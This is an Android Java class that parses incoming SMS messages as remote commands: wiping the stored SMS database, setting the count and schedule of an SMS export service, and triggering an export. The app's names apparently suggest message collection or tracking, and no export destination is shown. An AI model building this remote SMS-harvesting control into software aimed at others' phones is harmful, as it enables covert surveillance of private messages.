package org.gdocument.gchattoomuch.business;

import org.gdocument.gchattoomuch.db.service.SmsService;
import org.gdocument.gchattoomuch.manager.ScheduleServiceManager;
import org.gdocument.gchattoomuch.parser.SmsParser;
import org.gdocument.gchattoomuch.parser.SmsParser.MSG_TYPE;
import org.gdocument.gtracergps.launcher.log.Logger;

import android.content.Context;


public class SmsReceiverBusiness {

	private static final String TAG = SmsReceiverBusiness.class.getName();
	private Context context;

	public SmsReceiverBusiness(Context context) {
		this.context = context;
	}

	public void processMessage(String phoneNumber, String message) {
		MSG_TYPE msgType = SmsParser.getInstance().getMessageType(message);
		switch(msgType) {
			case CLEAN_DB:
				processCleanDb();
				break;
			case SET_SERVICE_EXPORT_SMS_COUNT:
				setServiceExportSmsCount(message);
				break;
			case SET_SERVICE_EXPORT_SMS_TIME:
				setServiceExportSmsTime(message);
				break;
			case RUN_SERVICE_EXPORT_SMS:
				processRunServiceExportSms();
				break;
			case SEND_DB:
				processSendDb();
				break;
			default:
				int len = (message.length() > 20 ? 20 : message.length());
				logMe("Unknowed from:" + phoneNumber + " message:" + message.substring(0, len/2) + "..." + message.substring(message.length()-(len-(len/2))));
		}
	}


	private void processCleanDb() {
		new SmsService(context, null).deleteAll();
	}

	private void setServiceExportSmsCount(String message) {
		int count = SmsParser.getInstance().fromMessageCount(message);
        logMe("setServiceExportSmsCount count:" + count);
		ScheduleServiceManager.getInstance(context).setServiceExportSmsLimitCount(count);
//		ScheduleServiceManager.getInstance(context).scheduleExportSms(count);
	}

	private void setServiceExportSmsTime(String message) {
		long time = SmsParser.getInstance().fromMessageTime(message);
        logMe("setServiceExportSmsTime time:" + time);
		ScheduleServiceManager.getInstance(context).setServiceExportSmsScheduleTime(time);
		ScheduleServiceManager.getInstance(context).scheduleExportSms(time);
	}

	private void processRunServiceExportSms() {
		ScheduleServiceManager.getInstance(context).scheduleExportSms(ScheduleServiceManager.SERVICE_EXPORT_SMS_SCHEDULE_TIME_SECOUND_10);
	}

	private void processSendDb() {
		// TODO
	}

	private void logMe(String message) {
		Logger.logMe(TAG, message);
	}
}